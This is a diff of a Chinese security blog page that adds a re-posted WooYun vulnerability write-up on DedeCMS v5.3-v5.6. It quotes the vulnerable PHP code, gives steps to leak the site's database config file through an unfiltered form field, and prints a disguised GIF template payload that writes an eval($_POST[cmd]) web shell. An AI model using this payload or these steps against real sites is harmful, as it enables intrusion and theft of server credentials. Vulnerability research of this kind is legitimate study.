@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
     <title>
         
-        关于我 · \xeb\xfe&#39;s Blog
+        dedecms v5.3-v5.6 Get Shell · \xeb\xfe&#39;s Blog
         
     </title>
     <link rel="icon" href= /assests/favicon.ico>
@@ -109,11 +109,22 @@ white-space: pre;
     
 </head>
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >\xeb\xfe&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">dedecms v5.3-v5.6 Get Shell</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>\xeb\xfe's Blog.</a>
 </header>
@@ -121,21 +132,43 @@ white-space: pre;
         <div class="site-intro">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
     <div class="site-intro-placeholder"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
+            dedecms v5.3-v5.6 Get Shell
+            <!-- 404 -->
+            
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = wooyun-1000php>wooyun-1000php</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2017/12/08</span>
+            </div>
         
     </div>
 </div>
@@ -205,11 +238,27 @@ white-space: pre;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="这里暂时什么都没有"><a href="#这里暂时什么都没有" class="headerlink" title="这里暂时什么都没有"></a>这里暂时什么都没有</h2>
+        <h3 id="简要描述"><a href="#简要描述" class="headerlink" title="简要描述"></a>简要描述</h3><p>在dedecms v5.3-v5.6 Get Shell 的基础上，作了修改，突破最新版本补丁，文件上传导致代码执行。</p>
+<h3 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------------</span></span><br><span class="line"><span class="comment">function _SaveArticle()&#123;  &#125;</span></span><br><span class="line"><span class="comment">------------------------------*/</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($dopost==<span class="string">'save'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(DEDEMEMBER.<span class="string">'/inc/archives_check_edit.php'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//分析处理附加表数据</span></span><br><span class="line">	$inadd_f = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($dede_addonfields))</span><br><span class="line">	&#123;</span><br><span class="line">		$addonfields = explode(<span class="string">';'</span>,$dede_addonfields);</span><br><span class="line">		<span class="keyword">if</span>(is_array($addonfields))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">foreach</span>($addonfields <span class="keyword">as</span> $v)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>($v==<span class="string">''</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				$vs = explode(<span class="string">','</span>,$v);</span><br><span class="line">				<span class="keyword">if</span>(!<span class="keyword">isset</span>($&#123;$vs[<span class="number">0</span>]&#125;))</span><br><span class="line">				&#123;</span><br><span class="line">					$&#123;$vs[<span class="number">0</span>]&#125; = <span class="string">''</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				$&#123;$vs[<span class="number">0</span>]&#125; = GetFieldValueA($&#123;$vs[<span class="number">0</span>]&#125;,$vs[<span class="number">1</span>],$aid);</span><br><span class="line">				$inadd_f .= <span class="string">','</span>.$vs[<span class="number">0</span>].<span class="string">" ='"</span>.$&#123;$vs[<span class="number">0</span>]&#125;.<span class="string">"' "</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$body = AnalyseHtmlBody($body,$description);</span><br><span class="line">	$body = HtmlReplace($body,<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//处理图片文档的自定义属性</span></span><br><span class="line">	<span class="keyword">if</span>($litpic!=<span class="string">''</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		$flag = <span class="string">'p'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//更新数据库的SQL语句</span></span><br><span class="line">	$upQuery = <span class="string">"Update `#@__archives` set</span></span><br><span class="line"><span class="string">             ismake='$ismake',</span></span><br><span class="line"><span class="string">             arcrank='$arcrank',</span></span><br><span class="line"><span class="string">             typeid='$typeid',</span></span><br><span class="line"><span class="string">             title='$title',</span></span><br><span class="line"><span class="string">             litpic='$litpic',</span></span><br><span class="line"><span class="string">             description='$description',</span></span><br><span class="line"><span class="string">             keywords='$keywords',            </span></span><br><span class="line"><span class="string">             flag='$flag'</span></span><br><span class="line"><span class="string">      where id='$aid' And mid='$mid'; "</span>;</span><br><span class="line">	<span class="keyword">if</span>(!$dsql-&gt;ExecuteNoneQuery($upQuery))</span><br><span class="line">	&#123;</span><br><span class="line">		ShowMsg(<span class="string">"把数据保存到数据库主表时出错，请联系管理员！"</span>.$dsql-&gt;GetError(),<span class="string">"-1"</span>);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($addtable!=<span class="string">''</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		$upQuery = <span class="string">"Update `$addtable` set typeid='$typeid',body='$body'&#123;$inadd_f&#125;,userip='$userip' where aid='$aid' "</span>;</span><br><span class="line">		<span class="keyword">if</span>(!$dsql-&gt;ExecuteNoneQuery($upQuery))</span><br><span class="line">		&#123;</span><br><span class="line">			ShowMsg(<span class="string">"更新附加表 `$addtable`  时出错，请联系管理员！"</span>,<span class="string">"javascript:;"</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		$dsql-&gt;ExecuteNoneQuery(<span class="string">"Update `#@__member_archives` set mtypeid = '$mtypesid' WHERE id = '$aid'"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	UpIndexKey($aid,$arcrank,$typeid,$sortrank,$tags);</span><br><span class="line">	$artUrl = MakeArt($aid,<span class="keyword">true</span>);</span><br><span class="line">	<span class="keyword">if</span>($artUrl==<span class="string">''</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		$artUrl = $cfg_phpurl.<span class="string">"/view.php?aid=$aid"</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>第10行变量$dede_addonfields 没有进行严格控制，$inadd_f可控（这是因为自定义模型所造成），没有限制用户所提交的信息，造成SQL注入漏洞。结合附加表数据自定义模板，造成爆任意文件源码漏洞。上传图片模板，可执行任意代码。</p>
+<h3 id="爆任意文件源码漏洞证明"><a href="#爆任意文件源码漏洞证明" class="headerlink" title="爆任意文件源码漏洞证明"></a>爆任意文件源码漏洞证明</h3><p>首先要有发表文章的权限（不需要审核通过，只要有发表和预览权限），会员登录后点击添加文章然后选择编辑，firefox右键查看元素，找到隐藏的dede_addonfields，把hidden去掉设置为显示，并且增加一个表单变量templet，并设置templet变量为templet，dede_addonfields为../data/common.inc.php，点击提交<br><img src="/2017/12/08/wooyun-1000php-13/12.jpg" alt=""><br>修改成功之后，直接点击查看文章，右键源代码就可以看到爆了<code>/data/common.inc.php</code>配置文件的源码。<br><img src="/2017/12/08/wooyun-1000php-13/13.jpg" alt=""></p>
+<h3 id="扩展利用"><a href="#扩展利用" class="headerlink" title="扩展利用"></a>扩展利用</h3><p>以附件形式上传任意设计的模板文件，利用dedecms标签语法在服务器解释执行，实现GetShell。<br>发表文章时，选择上传图片1.jpg，图片内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89aGIF89a &#123;dede:name runphp=<span class="string">'yes'</span>&#125;</span><br><span class="line">$fp = @fopen(<span class="string">"1.php"</span>, <span class="string">'a'</span>);</span><br><span class="line">@fwrite($fp, <span class="string">'&lt;'</span>.<span class="string">'?php'</span>.<span class="string">"\r\n\r\n"</span>.<span class="string">'eval($_POST[cmd])'</span>.<span class="string">"\r\n\r\n?"</span>.<span class="string">"&gt;\r\n"</span>);</span><br><span class="line">@fclose($fp);</span><br><span class="line">&#123;/dede:name&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上传图片成功后，点击附件管理-&gt;更改，得到jpg的链接地址<code>/dedecms53/uploads/userup/2/1512O33W-3U9.jpg</code>。<br>利用爆任意文件的方法实现getshell.</p>
+<h3 id="getshell漏洞证明"><a href="#getshell漏洞证明" class="headerlink" title="getshell漏洞证明"></a>getshell漏洞证明</h3><p><img src="/2017/12/08/wooyun-1000php-13/8.jpg" alt=""><br>我这里能构造代码，修改文章也成功了，但是弹出来了这个报错，没有实现最终getshell。<br><img src="/2017/12/08/wooyun-1000php-13/14.jpg" alt=""><br>原文说参考原漏洞自己构造一个表单，加上验证码，上传的时候图片虽为白页面，但文件成功传上，下载官方最新版，在自搭建环境测试成功！<br>测试成功会在plus目录下创建一个1.php,成功getshell。</p>
+<p>测试过这个漏洞的dalao,希望可以指点一下我。thanks…</p>
+<p>原文链接：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2010-0871.html" target="_blank" rel="noopener">dedecms v5.3-v5.6 Get Shell</a></p>
+
     </article>
     <!-- 前后页  -->
     <ul class="post-pager">
         
+        
+            <li class="previous">
+                <a href= "/2017/12/08/wooyun-1000php-12/" title= 游戏风云cms存在SQL注入 >
+                    <span>往后一页</span>
+                    <span>游戏风云cms存在SQL注入</span>
+                </a>
+            </li>
         
     </ul>
     <!-- 评论插件 -->
@@ -270,6 +319,13 @@ white-space: pre;
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简要描述"><span class="toc-number">1.</span> <span class="toc-text">简要描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#详细说明"><span class="toc-number">2.</span> <span class="toc-text">详细说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆任意文件源码漏洞证明"><span class="toc-number">3.</span> <span class="toc-text">爆任意文件源码漏洞证明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扩展利用"><span class="toc-number">4.</span> <span class="toc-text">扩展利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell漏洞证明"><span class="toc-number">5.</span> <span class="toc-text">getshell漏洞证明</span></a></li></ol>
+    </div>
     
     <div class="back-top">&#xe639;</div>
     <div class="sidebar">
